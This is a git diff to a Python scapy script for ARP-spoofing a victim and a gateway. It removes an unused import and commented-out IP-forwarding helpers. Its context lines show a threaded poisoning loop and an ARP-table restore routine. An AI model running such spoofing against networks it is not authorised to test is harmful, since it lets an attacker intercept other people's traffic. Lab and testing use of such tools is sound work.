@@ -1,5 +1,4 @@
 from scapy.all import srp, Ether, ARP, send
-import os
 import sys
 import threading
 import time
@@ -36,22 +35,6 @@ def restore(victim_ip, victim_mac, gateway_ip, gateway_mac):
     send(ARP(op=2, pdst=gateway_ip, psrc=victim_ip, hwsrc=victim_mac, hwdst="ff:ff:ff:ff:ff:ff"), count=5)
     print("[*] ARP tables restored")
 
-# # Function to enable IP forwarding
-# def enable_ip_forwarding():
-#     if os.name == "nt":
-#         os.system("netsh interface ipv4 set interface 1 forwarding=enabled")
-#     else:
-#         os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
-#     print("[*] IP forwarding enabled")
-
-# # Function to disable IP forwarding
-# def disable_ip_forwarding():
-#     if os.name == "nt":
-#         os.system("netsh interface ipv4 set interface 1 forwarding=disabled")
-#     else:
-#         os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
-#     print("[*] IP forwarding disabled")
-
 
 if __name__ == "__main__":
     try:
@@ -66,8 +49,6 @@ if __name__ == "__main__":
         print(f"[*] Victim MAC: {victim_mac}")
         print(f"[*] Gateway MAC: {gateway_mac}")
 
-        # enable_ip_forwarding()
-
         # Start ARP poisoning in a separate thread
         poison_thread = threading.Thread(target=poison, args=(c.VICTIM_IP, victim_mac, c.GATEWAY_IP, gateway_mac))
         poison_thread.start()
@@ -79,5 +60,4 @@ if __name__ == "__main__":
     except KeyboardInterrupt:
         print("[*] Stopping the script...")
         restore(c.VICTIM_IP, victim_mac, c.GATEWAY_IP, gateway_mac)
-        # disable_ip_forwarding()
         sys.exit(0)
